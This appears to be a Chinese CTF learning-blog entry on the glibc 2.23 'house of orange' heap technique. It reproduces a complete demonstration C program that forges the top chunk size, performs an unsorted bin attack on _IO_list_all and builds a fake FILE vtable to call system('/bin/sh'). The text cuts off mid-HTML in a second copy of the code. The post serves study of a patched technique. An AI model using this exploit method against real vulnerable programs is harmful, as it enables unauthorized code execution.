    <id>http://iyheart.github.io/2025/02/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/</id>
    <published>2025-02-13T12:45:55.000Z</published>
    <updated>2025-02-21T01:41:39.411Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考文章：<a href="https://www.cnblogs.com/ZIKH26/articles/16712469.html">关于house of orange(unsorted bin attack &amp;&amp;FSOP)的学习总结 - ZikH26 - 博客园 (cnblogs.com)</a></li></ul><h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1><ul><li>house of orange该攻击手法是在没有<code>free</code>函数的情况下，来获得一个在unsorted bin中的堆块。</li><li>漏洞成因的源码位置在<code>malloc.c</code>和<code>arena.c</code>中（glibc2.23）</li><li><code>house of orange</code>这种堆利用手法就已经开始与<code>IO</code>结合在一起了</li></ul><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><details>    <summary>源码</summary><p>​</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>老样子，翻译一遍源码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span 